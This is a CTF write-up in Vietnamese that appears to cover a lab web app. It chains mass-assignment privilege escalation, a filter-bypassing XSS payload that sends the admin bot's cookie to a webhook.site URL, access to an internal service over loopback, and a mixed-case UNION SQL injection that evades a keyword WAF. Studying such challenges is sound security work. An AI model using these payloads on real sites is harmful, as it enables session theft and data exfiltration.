## A Massive Problem

![image](https://hackmd.io/_uploads/SykIEFQ6Wx.png)

Ở ứng dụng này khi đăng ký tài khoản sẽ lấy thông tin và lưu vào trong database với role mặc định là `standard`.
```python
@app.route('/api/register', methods=['POST'])
def register():
    incoming = request.get_json(silent=True) or request.form.to_dict()
    username = incoming.get('username', '').strip()
    password = incoming.get('password', '')
    full_name = incoming.get('full_name', '').strip()
    title = incoming.get('title', '').strip()
    team = incoming.get('team', '').strip()
    if not username or not password or not full_name or not title or not team:
        return jsonify({'error': 'Please complete all required fields.'}), 400
    if not valid_password(password):
        return jsonify({'error': 'Password does not meet policy.'}), 400
    record = {
        'username': username,
        'password': password,
        'role': 'standard',
        'full_name': full_name,
        'title': title,
        'team': team
    }
    record.update(incoming)
    if not record.get('username') or not record.get('password') or not record.get('role'):
        return jsonify({'error': 'Unable to create account.'}), 400
    conn = get_db()
    conn.execute(
        'insert into users (username, password, role, full_name, title, team) values (?, ?, ?, ?, ?, ?) '
        'on conflict(username) do update set password=excluded.password, role=excluded.role, full_name=excluded.full_name, title=excluded.title, team=excluded.team',
        (record['username'], record['password'], record['role'], record['full_name'], record['title'], record['team'])
    )
```
Nhưng ứng dụng có một lỗ hổng là hàm `record.update()`.
```python
record = {
        'username': username,
        'password': password,
        'role': 'standard',
        'full_name': full_name,
        'title': title,
        'team': team
    }
    record.update(incoming)
```
Trong ứng dụng `incoming` ở đây sẽ là request server nhận ở dạng json được ép kiểu sang dạng dict. 
![image](https://hackmd.io/_uploads/r10wUKmpWe.png)

Còn `record` ở đây là dạng dict khi update sẽ merge 2 dict lại, các key ở `record` sẽ bị ghi đè nếu bị trùng trong `incoming`. Vậy ta chỉ cần gửi thêm phần `'role':'admin'` vào trong request thì phần ` 'role': 'standard'` sẽ bị ghi đè và ta chiếm được quyền admin. Sử dụng Burp suite để intercept và đăng ký tài khoản với role admin.

### 2. Chiếm tài khoản admin
Sau khi đăng nhập vào user zack, ta có thể sử dụng chức năng post note và note này sẽ được một con bot có session của admin đọc để kiểm duyệt. Ở đây ta có hàm của app để loại bỏ **XSS** bằng cách xoá bỏ các phần bị coi là độc hại.
```python
def sanitize_note(content):
    content = re.sub(r'<script.*?>.*?</script>', '', content, flags=re.IGNORECASE | re.DOTALL)
    content = re.sub(r'<details[\s\S]*?>[\s\S]*?</details>', '', content, flags=re.IGNORECASE)
    content = re.sub(r'<details[^>]*>', '', content, flags=re.IGNORECASE)
    content = re.sub(r'</details>', '', content, flags=re.IGNORECASE)
    content = re.sub(r'javascript:', '', content, flags=re.IGNORECASE)
    content = re.sub(r'on(load|error|click|submit|focus|toggle|begin|end|mouse\w+|key\w+|input|change|drag\w*|drop|scroll|wheel|pointer\w*)=', '', content, flags=re.IGNORECASE)
    return content
```
Như cặp thẻ `<script>abc</script>` hoàn chỉnh sẽ bị xoá bỏ từ thẻ đâu đến cuôi,.. Ta sẽ dùng payload như `<scr<details>ipt>alert(1)</scr<details>ipt>`, `<scr<details>ipt>alert(1)</scr<details>ipt>`, `<scr<script></script>ipt>alert(1)</scr<script></script>ipt>` ... và còn nhiều cách bypass khác.
Ở đây mình dùng hàm fetch để gửi cookie của admin về web hook và để chiếm admin session qua con bot của admin.
`<scr<script></script>ipt>fetch('https://webhook.site/8b555eb6-7c0d-459c-ac99-6af880880520?c='+document.cookie)</scr<script></script>ipt>`

### 3. Truy cập vào Intern-app nội bộ
Sau khi có session của admin ta có thể truy cập vào devtools và truy cập vào mạng nội bộ.
Đọc file docker-compose ta có thể thấy intern-app có chung network namespace nên ta có thể truy cập vào bằng devtool qua url `http://127.0.0.1:8080/`, filter hoàn toàn không chặn url này.
```dockerfile
 internal-app:
    build: ./internal-app
    container_name: securevault-internal
    volumes:
      - internal-data:/data
    env_file:
      - .env
    network_mode: "service:main-app"
    # Shares the main-app network namespace so loopback forms like 127.0.0.1 / 2130706433 reach port 8080
    restart: unless-stopped
```

### 4. Khai thác SQL Injection và lấy flag
Đây là bước cuối cùng để lấy flag. Ở intern app có chức năng `/search?q=` trực tiếp ghép chuỗi từ user và có thể bị khai thác **SQL Injection**.
```python
@app.route('/search')
def search():
    q = request.args.get('q', '')
    error = None
    results = None
    waf_blocked = False

    if q:
        if waf_check(q):
            waf_blocked = True
            return render_template_string(PAGE, query=q, results=None, error=None, waf_blocked=True)
        try:
            conn = get_db()
            sql = "SELECT id, name, department, status FROM employees WHERE name = '" + q + "'"
            cur = conn.cursor()
            cur.execute(sql)
            results = cur.fetchall()
            results = [list(row) for row in results]
            conn.close()
        except Exception as e:
            error = str(e)
            results = []

    return render_template_string(PAGE, query=q, results=results, error=error, waf_blocked=waf_blocked)
```
Ta thấy flag ở trong bảng scret. Và app có cơ chế **waf** để lọc **SQL Injection** như sau
```python
KEYWORDS = {
    "union", "select", "from", "where",
    "drop", "insert", "delete", "update",
    "exec", "execute", "load_file",
    "outfile", "dumpfile"
}

def is_bad_casing(word: str) -> bool:
    return word.islower() or word.isupper()


def waf_check(value: str) -> bool:
    for word in re.findall(r'\b\w+\b', value):
        if word.lower() in KEYWORDS:
            if is_bad_casing(word):
                return True

    if "--" in value:
        return True

    return False
```
Ở đây ta thấy sẽ check các từ, nếu có trong list `KEYWORDS` thì sẽ check qua hàm `is_bad_casing`, hàm này sẽ check toàn bộ keyword là in hoa hoặc in thường sẽ filter, và lỗ hổng chính là ở đây, ta sẽ dùng lẫn in hoa và in thường, ví dụ: `UNION` -> `UnIOn` sẽ bypass được filter. Còn phần comment block `--` ta sẽ dùng `/*` để comment, payload mình dùng
`' UniOn SElecT id, secret, secret, secret fRoM secrets /* `
encode url và gửi vào intern app ta thành công lấy được flag.
`'%20UniOn%20SElecT%20id,%20secret,%20secret,%20secret%20fRoM%20secrets%20/*%20`
